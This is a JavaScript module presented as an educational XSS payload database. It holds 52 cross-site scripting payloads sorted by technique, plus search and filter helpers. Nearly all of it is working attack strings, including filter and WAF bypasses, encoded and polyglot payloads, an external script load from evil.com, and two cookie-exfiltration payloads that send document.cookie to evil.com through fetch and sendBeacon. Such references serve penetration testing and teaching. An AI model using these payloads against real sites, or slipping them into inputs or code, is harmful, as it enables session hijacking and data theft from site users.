/**
 * Comprehensive XSS payload database for educational purposes
 * Organized by category, technique, and context
 */

export const payloads = [
  // Basic Script Tags
  {
    id: 1,
    payload: '<script>alert(1)</script>',
    category: 'basic',
    technique: 'script-tag',
    context: 'html',
    description: 'Classic XSS payload using script tag',
    severity: 'high',
    browsers: ['all']
  },
  {
    id: 2,
    payload: '<script>alert(document.domain)</script>',
    category: 'basic',
    technique: 'script-tag',
    context: 'html',
    description: 'Display current domain',
    severity: 'high',
    browsers: ['all']
  },
  {
    id: 3,
    payload: '<script src="//evil.com/xss.js"></script>',
    category: 'basic',
    technique: 'script-tag',
    context: 'html',
    description: 'External script injection',
    severity: 'critical',
    browsers: ['all']
  },

  // Event Handlers
  {
    id: 4,
    payload: '<img src=x onerror=alert(1)>',
    category: 'event-handler',
    technique: 'onerror',
    context: 'html',
    description: 'Image error event handler',
    severity: 'high',
    browsers: ['all']
  },
  {
    id: 5,
    payload: '<body onload=alert(1)>',
    category: 'event-handler',
    technique: 'onload',
    context: 'html',
    description: 'Body onload event',
    severity: 'high',
    browsers: ['all']
  },
  {
    id: 6,
    payload: '<svg onload=alert(1)>',
    category: 'event-handler',
    technique: 'onload',
    context: 'html',
    description: 'SVG onload event',
    severity: 'high',
    browsers: ['all']
  },
  {
    id: 7,
    payload: '<input onfocus=alert(1) autofocus>',
    category: 'event-handler',
    technique: 'onfocus',
    context: 'html',
    description: 'Input focus with autofocus',
    severity: 'high',
    browsers: ['all']
  },
  {
    id: 8,
    payload: '<marquee onstart=alert(1)>',
    category: 'event-handler',
    technique: 'onstart',
    context: 'html',
    description: 'Marquee onstart event',
    severity: 'medium',
    browsers: ['chrome', 'edge']
  },
  {
    id: 9,
    payload: '<details open ontoggle=alert(1)>',
    category: 'event-handler',
    technique: 'ontoggle',
    context: 'html',
    description: 'Details toggle event',
    severity: 'high',
    browsers: ['all']
  },

  // SVG-based
  {
    id: 10,
    payload: '<svg><script>alert(1)</script></svg>',
    category: 'svg',
    technique: 'svg-script',
    context: 'html',
    description: 'Script inside SVG',
    severity: 'high',
    browsers: ['all']
  },
  {
    id: 11,
    payload: '<svg><animate onbegin=alert(1) attributeName=x>',
    category: 'svg',
    technique: 'svg-animate',
    context: 'html',
    description: 'SVG animate onbegin',
    severity: 'high',
    browsers: ['firefox', 'chrome']
  },
  {
    id: 12,
    payload: '<svg><a xlink:href="javascript:alert(1)"><text x="0" y="20">XSS</text></a></svg>',
    category: 'svg',
    technique: 'svg-link',
    context: 'html',
    description: 'SVG link with JavaScript protocol',
    severity: 'high',
    browsers: ['all']
  },

  // HTML5 Tags
  {
    id: 13,
    payload: '<video src=x onerror=alert(1)>',
    category: 'html5',
    technique: 'video',
    context: 'html',
    description: 'Video tag error event',
    severity: 'high',
    browsers: ['all']
  },
  {
    id: 14,
    payload: '<audio src=x onerror=alert(1)>',
    category: 'html5',
    technique: 'audio',
    context: 'html',
    description: 'Audio tag error event',
    severity: 'high',
    browsers: ['all']
  },
  {
    id: 15,
    payload: '<iframe src="javascript:alert(1)">',
    category: 'html5',
    technique: 'iframe',
    context: 'html',
    description: 'Iframe with JavaScript protocol',
    severity: 'critical',
    browsers: ['all']
  },
  {
    id: 16,
    payload: '<object data="javascript:alert(1)">',
    category: 'html5',
    technique: 'object',
    context: 'html',
    description: 'Object with JavaScript data',
    severity: 'critical',
    browsers: ['all']
  },
  {
    id: 17,
    payload: '<embed src="javascript:alert(1)">',
    category: 'html5',
    technique: 'embed',
    context: 'html',
    description: 'Embed with JavaScript source',
    severity: 'critical',
    browsers: ['all']
  },

  // JavaScript Context
  {
    id: 18,
    payload: "'; alert(1); //",
    category: 'javascript',
    technique: 'string-break',
    context: 'javascript',
    description: 'Break out of JavaScript string',
    severity: 'high',
    browsers: ['all']
  },
  {
    id: 19,
    payload: '"; alert(1); //',
    category: 'javascript',
    technique: 'string-break',
    context: 'javascript',
    description: 'Break out of double-quoted string',
    severity: 'high',
    browsers: ['all']
  },
  {
    id: 20,
    payload: '-alert(1)-',
    category: 'javascript',
    technique: 'arithmetic',
    context: 'javascript',
    description: 'Arithmetic operator injection',
    severity: 'medium',
    browsers: ['all']
  },
  {
    id: 21,
    payload: '${alert(1)}',
    category: 'javascript',
    technique: 'template-literal',
    context: 'javascript',
    description: 'Template literal injection',
    severity: 'high',
    browsers: ['all']
  },

  // URL/Attribute Context
  {
    id: 22,
    payload: 'javascript:alert(1)',
    category: 'url',
    technique: 'javascript-protocol',
    context: 'url',
    description: 'JavaScript protocol in href',
    severity: 'high',
    browsers: ['all']
  },
  {
    id: 23,
    payload: 'data:text/html,<script>alert(1)</script>',
    category: 'url',
    technique: 'data-url',
    context: 'url',
    description: 'Data URL with HTML',
    severity: 'critical',
    browsers: ['all']
  },
  {
    id: 24,
    payload: '" onclick="alert(1)',
    category: 'attribute',
    technique: 'attribute-break',
    context: 'attribute',
    description: 'Break out of attribute to add event',
    severity: 'high',
    browsers: ['all']
  },
  {
    id: 25,
    payload: '" autofocus onfocus="alert(1)',
    category: 'attribute',
    technique: 'attribute-break',
    context: 'attribute',
    description: 'Attribute with autofocus trick',
    severity: 'high',
    browsers: ['all']
  },

  // Filter Bypasses
  {
    id: 26,
    payload: '<scr<script>ipt>alert(1)</scr<script>ipt>',
    category: 'bypass',
    technique: 'nested-tags',
    context: 'html',
    description: 'Bypass tag stripping filters',
    severity: 'medium',
    browsers: ['all']
  },
  {
    id: 27,
    payload: '<img src=x onerror="alert(1)"',
    category: 'bypass',
    technique: 'unclosed-tag',
    context: 'html',
    description: 'Unclosed tag to bypass parsing',
    severity: 'medium',
    browsers: ['all']
  },
  {
    id: 28,
    payload: '<img src=x oneRRor=alert(1)>',
    category: 'bypass',
    technique: 'case-variation',
    context: 'html',
    description: 'Case variation bypass',
    severity: 'low',
    browsers: ['all']
  },
  {
    id: 29,
    payload: '<img src=x onerror=alert`1`>',
    category: 'bypass',
    technique: 'template-literal',
    context: 'html',
    description: 'Template literal instead of parentheses',
    severity: 'medium',
    browsers: ['all']
  },
  {
    id: 30,
    payload: '<svg/onload=alert(1)>',
    category: 'bypass',
    technique: 'slash-separator',
    context: 'html',
    description: 'Slash as attribute separator',
    severity: 'medium',
    browsers: ['all']
  },

  // Encoding Tricks
  {
    id: 31,
    payload: '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>',
    category: 'encoding',
    technique: 'html-entities',
    context: 'html',
    description: 'HTML entity encoding',
    severity: 'medium',
    browsers: ['all']
  },
  {
    id: 32,
    payload: '<img src=x onerror="\\u0061\\u006c\\u0065\\u0072\\u0074(1)">',
    category: 'encoding',
    technique: 'unicode',
    context: 'html',
    description: 'Unicode escape sequences',
    severity: 'medium',
    browsers: ['all']
  },
  {
    id: 33,
    payload: '<img src=x onerror="\\x61\\x6c\\x65\\x72\\x74(1)">',
    category: 'encoding',
    technique: 'hex',
    context: 'html',
    description: 'Hex escape sequences',
    severity: 'medium',
    browsers: ['all']
  },
  {
    id: 34,
    payload: '<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
    category: 'encoding',
    technique: 'base64',
    context: 'html',
    description: 'Base64 encoded payload',
    severity: 'high',
    browsers: ['all']
  },

  // Polyglots
  {
    id: 35,
    payload: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//',
    category: 'polyglot',
    technique: 'multi-context',
    context: 'multi',
    description: 'XSS polyglot for multiple contexts',
    severity: 'critical',
    browsers: ['all']
  },
  {
    id: 36,
    payload: 'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\" onmouseover=/*&lt;svg/*/onload=alert()//>',
    category: 'polyglot',
    technique: 'multi-context',
    context: 'multi',
    description: 'Another XSS polyglot',
    severity: 'critical',
    browsers: ['all']
  },

  // DOM-based
  {
    id: 37,
    payload: '#<img src=x onerror=alert(1)>',
    category: 'dom',
    technique: 'hash-injection',
    context: 'dom',
    description: 'DOM-based via URL hash',
    severity: 'high',
    browsers: ['all']
  },
  {
    id: 38,
    payload: '?search=<script>alert(1)</script>',
    category: 'dom',
    technique: 'query-injection',
    context: 'dom',
    description: 'DOM-based via query parameter',
    severity: 'high',
    browsers: ['all']
  },

  // WAF Bypasses
  {
    id: 39,
    payload: '<img src=x:alert(1) onerror=eval(src)>',
    category: 'waf-bypass',
    technique: 'eval-src',
    context: 'html',
    description: 'Bypass using eval with src attribute',
    severity: 'high',
    browsers: ['all']
  },
  {
    id: 40,
    payload: '<svg><script>alert&#40;1)</script>',
    category: 'waf-bypass',
    technique: 'entity-bypass',
    context: 'html',
    description: 'HTML entity in parentheses',
    severity: 'medium',
    browsers: ['all']
  },
  {
    id: 41,
    payload: '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
    category: 'waf-bypass',
    technique: 'fromCharCode',
    context: 'html',
    description: 'Obfuscation using fromCharCode',
    severity: 'medium',
    browsers: ['all']
  },

  // Less Common Vectors
  {
    id: 42,
    payload: '<link rel="import" href="data:text/html,<script>alert(1)</script>">',
    category: 'advanced',
    technique: 'link-import',
    context: 'html',
    description: 'HTML import with data URL',
    severity: 'high',
    browsers: ['chrome-old']
  },
  {
    id: 43,
    payload: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    category: 'advanced',
    technique: 'meta-refresh',
    context: 'html',
    description: 'Meta refresh with JavaScript',
    severity: 'high',
    browsers: ['all']
  },
  {
    id: 44,
    payload: '<form action="javascript:alert(1)"><input type="submit">',
    category: 'advanced',
    technique: 'form-action',
    context: 'html',
    description: 'Form with JavaScript action',
    severity: 'medium',
    browsers: ['all']
  },
  {
    id: 45,
    payload: '<button formaction="javascript:alert(1)">X</button>',
    category: 'advanced',
    technique: 'formaction',
    context: 'html',
    description: 'Button formaction attribute',
    severity: 'medium',
    browsers: ['all']
  },
  {
    id: 46,
    payload: '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
    category: 'advanced',
    technique: 'mathml',
    context: 'html',
    description: 'MathML XSS vector',
    severity: 'medium',
    browsers: ['firefox']
  },

  // IE/Edge Legacy
  {
    id: 47,
    payload: '<img src=x:alert(1) onerror=eval(src) alt=``,``>',
    category: 'legacy',
    technique: 'ie-quirks',
    context: 'html',
    description: 'IE-specific eval bypass',
    severity: 'medium',
    browsers: ['ie', 'edge-legacy']
  },
  {
    id: 48,
    payload: '<style>@import\'javascript:alert(1)\';</style>',
    category: 'legacy',
    technique: 'css-import',
    context: 'html',
    description: 'CSS import with JavaScript (IE)',
    severity: 'low',
    browsers: ['ie']
  },

  // Modern Vectors
  {
    id: 49,
    payload: '<img src onerror="fetch(\'//evil.com?\'+document.cookie)">',
    category: 'modern',
    technique: 'exfiltration',
    context: 'html',
    description: 'Cookie exfiltration using fetch',
    severity: 'critical',
    browsers: ['all']
  },
  {
    id: 50,
    payload: '<img src onerror="navigator.sendBeacon(\'//evil.com\',document.cookie)">',
    category: 'modern',
    technique: 'beacon',
    context: 'html',
    description: 'Data exfiltration using sendBeacon',
    severity: 'critical',
    browsers: ['all']
  },
  {
    id: 51,
    payload: '<script>import(\'data:text/javascript,alert(1)\')</script>',
    category: 'modern',
    technique: 'dynamic-import',
    context: 'html',
    description: 'Dynamic import with data URL',
    severity: 'high',
    browsers: ['modern']
  },
  {
    id: 52,
    payload: '<iframe srcdoc="<script>parent.alert(1)</script>">',
    category: 'modern',
    technique: 'srcdoc',
    context: 'html',
    description: 'Iframe srcdoc attribute',
    severity: 'high',
    browsers: ['all']
  }
];

export const categories = [
  { id: 'all', name: 'All Payloads', count: payloads.length },
  { id: 'basic', name: 'Basic', count: payloads.filter(p => p.category === 'basic').length },
  { id: 'event-handler', name: 'Event Handlers', count: payloads.filter(p => p.category === 'event-handler').length },
  { id: 'svg', name: 'SVG-based', count: payloads.filter(p => p.category === 'svg').length },
  { id: 'html5', name: 'HTML5 Tags', count: payloads.filter(p => p.category === 'html5').length },
  { id: 'javascript', name: 'JavaScript Context', count: payloads.filter(p => p.category === 'javascript').length },
  { id: 'url', name: 'URL Context', count: payloads.filter(p => p.category === 'url').length },
  { id: 'attribute', name: 'Attribute Context', count: payloads.filter(p => p.category === 'attribute').length },
  { id: 'bypass', name: 'Filter Bypasses', count: payloads.filter(p => p.category === 'bypass').length },
  { id: 'encoding', name: 'Encoding Tricks', count: payloads.filter(p => p.category === 'encoding').length },
  { id: 'polyglot', name: 'Polyglots', count: payloads.filter(p => p.category === 'polyglot').length },
  { id: 'dom', name: 'DOM-based', count: payloads.filter(p => p.category === 'dom').length },
  { id: 'waf-bypass', name: 'WAF Bypasses', count: payloads.filter(p => p.category === 'waf-bypass').length },
  { id: 'advanced', name: 'Advanced', count: payloads.filter(p => p.category === 'advanced').length },
  { id: 'legacy', name: 'IE/Legacy', count: payloads.filter(p => p.category === 'legacy').length },
  { id: 'modern', name: 'Modern', count: payloads.filter(p => p.category === 'modern').length }
];

export const getPayloadsByCategory = (category) => {
  if (category === 'all' || !category) return payloads;
  return payloads.filter(p => p.category === category);
};

export const searchPayloads = (query) => {
  if (!query) return payloads;
  const lowerQuery = query.toLowerCase();
  return payloads.filter(p =>
    p.payload.toLowerCase().includes(lowerQuery) ||
    p.description.toLowerCase().includes(lowerQuery) ||
    p.technique.toLowerCase().includes(lowerQuery)
  );
};
